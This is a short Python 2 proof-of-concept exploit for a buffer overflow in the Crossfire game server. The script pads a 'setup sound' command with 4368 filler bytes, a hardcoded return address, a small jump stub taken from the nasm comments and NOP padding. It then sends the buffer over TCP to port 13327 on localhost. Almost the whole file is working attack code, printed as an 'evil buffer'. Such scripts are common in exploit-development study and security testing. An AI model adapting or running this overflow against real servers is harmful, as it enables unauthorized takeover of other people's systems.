#!/usr/bin/python 

# Proof of concept for Crossfire game 
# Buffer overflow vulnerability 

#nasm > add eax,12
#00000000  83C00C            add eax,byte +0xc
#nasm > jmp eax
#00000000  FFE0              jmp eax
#nasm > 

import socket 

ret = "\x96\x45\x13\x08"

host = "127.0.0.1" 

crash = "\x41" * 4368 + ret + "\x83\xC0\x0C\xFF\xE0" + "\x90" * (7-5) 

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

print "[*]Sending evil buffer..." 
s.connect((host,13327))
s.send(buffer)
data=s.recv(1024)
print data 
s.close()
print "[*]Payload Sent!" 

